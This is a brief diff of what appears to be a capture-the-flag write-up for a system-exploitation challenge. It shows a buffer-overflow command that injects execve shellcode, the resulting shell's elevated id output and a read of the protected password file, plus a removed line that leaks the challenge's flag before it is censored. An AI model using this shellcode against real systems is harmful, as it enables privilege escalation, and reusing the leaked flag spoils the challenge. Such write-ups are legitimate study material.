@@ -44,6 +44,5 @@ app-systeme-ch7@challenge02:~$ ./ch7 `python -c "print '\x31\xc0\x50\x68\x2f\x2f
 $ id
 uid=1107(app-systeme-ch7) gid=1107(app-systeme-ch7) euid=1207(app-systeme-ch7-cracked) groups=1207(app-systeme-ch7-cracked),100(users),1107(app-systeme-ch7)
 $ cat .passwd
-aod8r2f!q:;oe
-
+<censored>
 ```
